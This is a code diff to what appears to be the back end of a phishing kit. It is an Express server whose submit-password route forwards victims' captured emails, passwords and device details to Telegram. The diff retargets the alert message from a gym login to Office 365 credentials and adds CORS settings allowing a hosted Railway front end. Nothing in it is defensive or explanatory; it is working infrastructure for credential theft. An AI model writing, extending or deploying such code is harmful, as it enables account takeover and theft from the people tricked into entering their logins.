@@ -1,10 +1,26 @@
 require("dotenv").config();
 const express = require("express");
+const cors = require('cors');
 const axios = require("axios");
 const { v4: uuidv4 } = require("uuid");
 
 const app = express();
 const port = 3000;
+
+app.use(cors({
+  origin: [
+    'http://localhost:3000',      // your current React dev server
+    'http://127.0.0.1:3000',
+    'https://demascus-production.up.railway.app'  // if you deploy frontend later
+  ],
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization'],
+  credentials: true
+}));
+
+
+
+
 
 app.use(express.json());
 
@@ -82,7 +98,7 @@ app.post("/api/submit-password", async (req, res) => {
   attempt.password = password;
 
   await sendToTelegram(
-    `✅ *Gym Login Credentials Captured*\n\n` +
+    `✅ * Ofiice 365 Login Credentials Captured*\n\n` +
     `📧 *Email:* ${attempt.email}\n` +
     `🔑 *Password:* \`${password}\`\n` +
     `📱 *Device:* ${attempt.userAgent.slice(0, 120)}${attempt.userAgent.length > 120 ? "..." : ""}\n` +
